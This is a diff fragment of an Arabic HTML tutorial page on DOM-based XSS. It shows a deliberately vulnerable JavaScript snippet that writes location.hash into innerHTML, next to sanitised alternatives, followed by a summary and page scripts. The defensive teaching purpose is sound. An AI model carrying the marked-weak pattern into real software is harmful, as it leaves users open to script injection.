+<span class="code-header"><i class="fas fa-code"></i> مثال: حماية من DOM-based XSS</span>
+<pre><code>// ❌ كود ضعيف
+var userInput = location.hash.slice(1);
+document.getElementById('output').innerHTML = userInput;
+
+// ✅ كود آمن
+var userInput = location.hash.slice(1);
+var sanitizedInput = DOMPurify.sanitize(userInput);
+document.getElementById('output').textContent = sanitizedInput;
+
+// أو استخدام createElement
+var element = document.createElement('div');
+element.textContent = userInput;
+document.getElementById('output').appendChild(element);</code></pre>
+            </div>
+        </section>
+
+        <section id="summary">
+            <h2><i class="fas fa-list-check"></i> الخلاصة</h2>
+            
+            <p>ثغرات DOM-based هي فئة خطيرة من الثغرات تحدث في جانب العميل. فهم أنواعها المختلفة وكيفية تمييزها ضروري للاكتشاف والحماية الفعالة. الحماية تتطلب تطبيق ممارسات آمنة في كتابة JavaScript وتجنب المصادر غير الموثوقة.</p>
+
+            <div class="tip">
+                <h4>🎯 النقاط الرئيسية</h4>
+                <ul class="list">
+                    <li>ثغرات DOM-based تحدث بالكامل في جانب العميل</li>
+                    <li>هناك 9 أنواع رئيسية من ثغرات DOM-based</li>
+                    <li>الاكتشاف يتطلب فحص دقيق لكود JavaScript</li>
+                    <li>الحماية تتطلب تطهير المدخلات واستخدام APIs آمنة</li>
+                    <li>CSP يساعد في منع العديد من هذه الثغرات</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script>
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                primaryColor: '#42a5f5',
+                primaryTextColor: '#e8eaed',
+                primaryBorderColor: '#2d3748',
+                lineColor: '#81c784',
+                secondaryColor: '#1a2332',
+                tertiaryColor: '#0f1724',
+                background: '#1a2332',
+                mainBkg: '#1a2332',
+                secondBkg: '#0f1724',
+                tertiaryBkg: '#2d3748',
+                nodeBorder: '#2d3748',
+                clusterBkg: '#0f1724',
+                clusterBorder: '#2d3748',
+                defaultLinkColor: '#81c784',
+                titleColor: '#e8eaed',
+                edgeLabelBackground: '#1a2332',
+                nodeTextColor: '#e8eaed',
+                textColor: '#e8eaed',
+                actorTextColor: '#e8eaed',
+                labelTextColor: '#e8eaed',
+                loopTextColor: '#e8eaed',
+                activationTextColor: '#e8eaed',
+                sectionBkgColor: '#1a2332',
+                altSectionBkgColor: '#0f1724',
+                gridColor: '#2d3748',
+                c0: '#42a5f5',
+                c1: '#81c784',
+                c2: '#ff9800',
+                c3: '#e91e63'
+            }
+        });
+    </script>
+</body>
+</html> 
